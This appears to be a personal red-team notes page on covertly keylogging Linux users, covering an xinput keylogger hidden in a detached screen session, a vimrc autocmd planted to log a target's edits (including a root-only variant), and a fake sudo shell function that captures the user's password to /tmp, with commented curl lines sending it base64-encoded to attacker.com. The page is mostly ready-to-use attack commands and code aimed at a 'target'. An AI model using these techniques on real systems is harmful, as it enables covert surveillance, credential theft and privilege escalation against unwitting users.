# Keylogging

## 01 - `script`

Run a multiplexer terminal program to leave it in the background.

```
$ screen -S keylogger

$ export DISPLAY=:0.0

$ export | grep -i display
```

Exporting the keyboard mapping will show the keybindings that can be translated to actual keystrokes.

```
$ xmodmap -pke > xmodmap-pke.txt

$ head -n20 xmodmap-pke.txt
```

Find the virtual core keyboard to record keystrokes then detach the session to leave it in the background with (`CTRL+D`).

```
$ xinput list

$ script -c "xinput test <X_id>" -a xinput-keylogger.log
```

While it's still running in the background use `xkeyscan` ( a python script is included in the references below) to convert the decimal base 10 values to printable ASCII characters.

```
$ python xkeyscan.py xinput-keylogger.log
```

## 02 - `vim`

### 2.1 - Common File Destinations

```
$HOME/.vimrc
$HOME/.vim/plugin/settings.vim
```

### 2.2 - Vim scripts for logging keystrokes

Normal user

```
:autocmd BufWritePost * :silent :w! >> /tmp/vim-keystrokes.txt
```

Under elevated user context when the user is running as `sudo`.

```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/vim-keystrokes.txt
:endif
```

### 2.3 - Insert keylogging configuration

Gather timestamps and backup the config resource file. Also try to improvise by instead of getting rid of the rest of the vim config content's. Modify it to ensure it contains no syntax errors. Then wait for the target when he interacts with VIM.

```
$ stat ~/.vimrc
$ cp ~/.vimrc /tmp/.vimrc.bak
$ echo "" > ~/.vimrc
$ cat ~/.vimrc
:autocmd BufWritePost * :silent :w! >> /tmp/vim-keystrokes.txt
```

## 03 - `sudo`

```
$ type sudo
sudo is /usr/bin/sudo
```

```bash
function sudo () {
  # A "realsudo" variable is created. It calls the `which` command to locate
  # the path to the real sudo binary. This is used later in the function to
  # execute the target's desired command.
  realsudo="$(which sudo)"

  # The `read` command will prompt (`-p`) the target with a convincing password
  # request. The `-s` argument hides the input password, just as the real
  # sudo command would. The target password is then set in the "inputPasswd"
  # variable.
  read -s -p "[sudo] password for $USER: " inputPasswd

  # There are two `printf` commands here, separated by a semicolon.
  # The first simply prints a new line in the terminal, as the real sudo
  # does. The second writes the target's username and password to a
  # file called "hackedPasswd.txt" in the /tmp directory.
  printf "\n"; printf '%s\n' "$USER : $inputPasswd" >/tmp/hackedPasswd.txt

  # As an alternative to writing the password to the /tmp directory,
  # it can be exfiltrated to the attacker's server. Uncomment the below
  # "encoded" and "curl" lines to enable this function. The password
  # is encoded with `base64` to make it easier to transmit in the URL.
  # encoded=$(printf '%s' "$inputPasswd" | base64) >/dev/null 2>&1
  # curl -s "http://attacker.com/$USER:$encoded" >/dev/null 2>&1

  # The `-S` option allows users to input their sudo password using the command
  # line. This is used to run an arbitrary `exit` command (`-c`) as the root
  # user (`-u`) to unlock the sudo timeout function. This command and its
  # output are hidden (/dev/null) from the target. It's only here to allow
  # sudo usage for future commands.
  # For more on sudo timeouts and /dev/null, see:
  # https://itsfoss.com/change-sudo-password-timeout-ubuntu/
  # https://stackoverflow.com/questions/10508843/what-is-dev-null-21
  $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" >/dev/null 2>&1

  # With the sudo timeout engaged, privileged commands can be run without
  # prompting the user for a password. This line will execute the target's
  # desired command.
  $realsudo "${@:1}"
}

export -f /usr/bin/sudo sudo
```

```
$ type sudo
sudo is a function
..[omitted]..
```

---
## References

- [[Screen]]

- [RedHat: Record your terminal with script and scriptreplay](https://www.redhat.com/sysadmin/record-terminal-script-scriptreplay )

- [xkeyscan](https://github.com/porterhau5/xkeyscan)

- [Natively Keylogging NIX Systems](http://legacy.popped.io/2016/06/natively-keylogging-nix-systems.html)

- [Using xkeyscan to Parse an X-Based Linux Keylogger](https://porterhau5.com/blog/xkeyscan-parse-linux-keylogger/)

- [Null Byte: Steal Ubuntu & MacOS Sudo Passwords Without Any Cracking](https://null-byte.wonderhowto.com/how-to/steal-ubuntu-macos-sudo-passwords-without-any-cracking-0194190/)

- [Und3rf10w: Tales from the Terminal - Silly Sudo Backdoors](https://und3rf10w.github.io/posts/2022/01/07/sudodoor.html)